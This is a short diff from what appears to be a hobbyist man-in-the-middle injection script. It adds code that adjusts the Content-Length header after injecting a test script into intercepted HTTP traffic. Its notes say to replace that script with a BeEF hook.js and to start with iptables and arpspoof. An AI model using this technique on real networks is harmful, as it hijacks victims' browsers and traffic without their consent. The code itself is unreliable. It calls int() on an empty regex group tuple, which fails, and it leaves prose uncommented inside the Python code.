@@ -393,9 +393,13 @@ certain webservers set a field called content length making it impossible to inj
 content_len_search = re.search('Content-length\s\d*',load)
 if content_len_search:
         content_len = content_len_search.groups(0)
+        new_content_len = int(content_len) + len('<script>alert(test);</script>')
+        load = load.replace(content_len,str(new_content_len))
+        
   
   #need to use non-capturing group to get only digits in content length ie '(?:Content-length\s)(\d*)'  --> (?:) - non-capturing ie just for matching not printed
-  now use group(1) since 0 will return everyting thats matched. 
+  now use group(1) since 0 will return everyting thats matched. now bring in beef. hook.js be injected as above.Replacing the script 
+  part with hook script. iptables + arpspoof for mitm ate always the first steps.
                         
          
                         
